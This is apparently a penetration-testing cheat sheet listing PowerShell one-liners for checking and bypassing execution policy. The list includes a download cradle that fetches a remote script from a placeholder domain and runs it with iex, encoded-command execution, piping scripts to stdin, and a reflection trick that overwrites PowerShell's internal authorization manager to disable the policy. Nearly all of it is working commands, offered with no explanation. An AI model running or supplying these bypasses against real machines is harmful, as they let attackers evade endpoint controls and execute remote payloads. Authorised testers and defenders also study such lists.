### Check execution policy 
```
Get-ExecutionPolicy -List | Format-Table -AutoSize
```

### Different bypass techniques
```
Echo Write-Host "&lt;command&gt;"  | PowerShell.exe -noprofile -

Get-Content &lt;file&gt;.ps1 | PowerShell.exe -noprofile -  

type &lt;file&gt;.ps1 | PowerShell.exe -noprofile -  

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('&lt;domain&gt;/&lt;file&gt;')"  

Powershell -command "Write-Host '&lt;command&gt;'"  

Powershell -c "Write-Host '&lt;command&gt;'"  

powershell.exe -EncodedCommand $encodedCommand  

Invoke-Command -scriptblock {Write-Host "&lt;command&gt;"}  

Get-Content .&lt;file&gt;.ps1 | Invoke-Expression  

PowerShell.exe -ExecutionPolicy Bypass -File &lt;file&gt;.ps1  

PowerShell.exe -ExecutionPolicy UnRestricted -File &lt;file&gt;.ps1  

PowerShell.exe -ExecutionPolicy Remote-signed -File &lt;file&gt;.ps1  

function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy  &lt;file&gt;.ps1  

Set-ExecutionPolicy Bypass -Scope Process -Force  

Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force  
```


